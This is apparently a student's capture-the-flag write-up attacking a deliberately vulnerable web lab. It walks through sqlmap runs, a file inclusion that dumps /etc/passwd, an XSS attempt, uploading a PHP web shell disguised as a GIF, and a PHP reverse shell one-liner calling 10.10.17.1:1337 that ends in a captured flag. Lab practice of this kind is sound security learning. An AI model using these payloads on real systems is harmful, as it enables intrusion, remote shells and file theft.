I started out by trying to use sqlmap, on the https://darian-patronizable-delila.ngrok-free.dev/vulnerabilities/sqli/ page. 

with commands like:  
sqlmap -u "darian-patronizable-delila.ngrok-free.dev/vulnerabilities/sqli/?id=s  
sqlmap -u "https://darian-patronizable-delila.ngrok-free.dev/vulnerabilities/sqli/?role=&debug=&id=s&Submit=Submit"  

Which did not lead to any findings. It seems like the tunnel service (ngrok)  
blocks my requests after a little while, especially when using tools like dirb or sqlmap that sends a lot of requests.


When this was fixed, i started using dirb again, and found the  
.gitignore file with:  
```
# Neither the config file or its backup should go
# into the repo.
config/config.inc.php.bak
config/config.inc.php

# Vim swap files
.*swp

# VS Code editor files
*.code-workspace

# Used by pytest
tests/__pycache__/

# Don't include any uploaded images
hackable/uploads/*
.DS_Store
.DS_Store
```

I tried to use file inclusion to get to the files:  
config/config.inc.php.bak
config/config.inc.php  

by using: 
http://100.113.75.28:8081/vulnerabilities/fi/?page=/config/config.inc.php  

Which outputs:  
include(): Failed opening '/config/config.inc.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/vulnerabilities/fi/index.php on line 45  

I then tried:  
http://100.113.75.28:8081/vulnerabilities/fi/?page=/usr/local/lib/php/config/config.inc.php  

which gave the same error.

I also tried url encoding it: 
%2Fusr%2Flocal%2Flib%2Fphp%2Fconfig%2Fconfig.inc.php

which gave the same error 😠

Then I realized it let me do something impossible, as it clearly states that:  
```
This lab relies on the PHP include and require functions being able to include content from remote hosts. As this is a security risk, PHP have deprecated this in version 7.4 and it will be removed completely in a future version. If this lab is not working correctly for you, check your PHP version and roll back to version 7.4 if you are on a newer version which has lost the feature.

You are running PHP version: 8.5.0
```

Ruling out file inclusion for now.


I also tried to do file inclusion with:  
http://100.113.75.28:8081/vulnerabilities/fi/?page=/etc/passwd  

Which resulted in:  
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing 
List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin 
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin


I also tried to do an sql injection on the brute force page with:  
sqlmap -u "http://100.113.75.28:8081/vulnerabilities/brute/" --data "username=xxxxx&password=xxxxx&Login=Login&user_token=e701278829f7f0a9cdf1d568e2d87cb7"

No results from this.

I also tried to fuzz the http redirects using fluff with ids from 0-1000:    
 python3 fluff.py --url "http://100.113.75.28:8081/vulnerabilities/open_redirect/source/info.php?id=FUZZ" --list numbers.txt -c security:custom -c PHPSESSID:a9fdcc6d03ea838e42a451f3427e28dd

which did not give any results.


I am now checking out the XSS tab.
I can redirect myself to an invalid path (nice).

I said I gave up on file inclusion, but tried to do 3d chess by using xss to do the file inclusion with:  
<script><a href="http://100.113.75.28:8081/vulnerabilities/fi/?page=/config.inc.php">click</a></script>  
which redirected me to the file inclusion page, but did not work...

I then went to the file upload and uploaded an image of my delicious home made  
pesto. I then got this message back:  
Uploaded successfully: hackable/uploads/custom_a9fdcc6d03ea838e42a451f3427e28dd/ img_d9be5c382b.jpg  
Then tried to go to this path:  
Parse error: syntax error, unexpected token "&", expecting end of file in /var/www/html/hackable/uploads/custom_a9fdcc6d03ea838e42a451f3427e28dd/img_ff3eb9bce9.jpg on line 128  

Which lead me (through some googling) to believe that I can upload a php script, with a .jpg ending, and it will execute it.  

I couldn't just upload it like that, so to bypass the MIME check, I had to add a magic number at the top of the file, and I gave give the file the file ending .gif:  
GIF89a;
<?php
  echo "Hello World!";
?>   

Once I saw this worked, I went with a pretty non-standard way of getting information from the system.  
By using the scandir() command, I could read the contents of the different directories on the server.  
The problem with this approach was that it took very long time to explore all of the directories,  
so I pretty quickly decided to change the approach.   

I decided on trying to make a reverse shell with:   
$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");  

Which didn't work, but the script here worked:  
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Once I gained access, I looked around for a while and finally found the flag in the  
foothold (???) directory. But because cat was disabled for the file, I had to use strings to get the contents.  
Flag: FLAG{INITIAL_FOOTHOLD_ACHIEVED}s

After that, I went back to check if my original, more "interessting" approach also could work:

GIF89a;
<?php
$filename = "/foothold/flag.txt"; 

// Check if the file exists before attempting to read
if (file_exists($filename)) {
    $fileContents = file_get_contents($filename);

    if ($fileContents !== false) {
        echo "File Contents:\n";
        echo $fileContents;
    } else {
        echo "Error reading file: " . $filename;
    }
} else {
    echo "File not found: " . $filename;
}
?>

This also actually worked.
